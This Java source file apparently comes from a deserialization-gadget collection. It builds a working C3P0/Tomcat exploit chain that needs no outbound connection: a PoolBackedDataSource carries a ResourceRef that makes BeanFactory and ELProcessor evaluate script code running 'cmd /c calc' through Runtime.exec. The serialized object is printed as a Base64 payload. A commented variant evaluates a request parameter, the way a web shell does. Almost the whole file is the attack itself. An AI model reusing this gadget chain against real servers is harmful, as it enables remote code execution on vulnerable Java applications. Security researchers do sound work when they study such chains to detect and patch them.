package gadget;

import com.fasterxml.jackson.databind.ser.Serializers;
import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;
import util.ReflectionUtils;
import util.SerializerUtils;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.Base64;
import java.util.logging.Logger;

//C3P0不出网利用
public class C3P0Tomcat {
    public static void main(String[] args) throws Exception {
        C3P0Tomcat c3P0 = new C3P0Tomcat();
        Object object = c3P0.getObject();

        System.out.println(Base64.getEncoder().encodeToString(SerializerUtils.serialize(object)));

//        unserialize();
    }
    public Object getObject () throws Exception {
        PoolBackedDataSource b=new PoolBackedDataSource();
        ReflectionUtils.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource("org.apache.naming.factory.BeanFactory", null));
        return b;
    }
    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        @Override
        public Reference getReference() {
//            String elcode = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(pageContext.request.getParameter(\"ant\"))";
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
            resourceRef.add(new StringRefAddr("forceString", "x=eval"));
            resourceRef.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"var s = [3];s[0] = \\\"cmd\\\";s[1] = \\\"/c\\\";s[2] = \\\"calc\\\";var p = java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),\\\"GBK\\\").useDelimiter(\\\"\\\\\\\\A\\\");var result = sc.hasNext() ? sc.next() : \\\"\\\";sc.close();result;\")"));
            return resourceRef;
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("C3P0.bin"));
        objectOutputStream.writeObject(obj);
    }

    public static void unserialize() throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("C3P0.bin"));
        objectInputStream.readObject();
    }
}
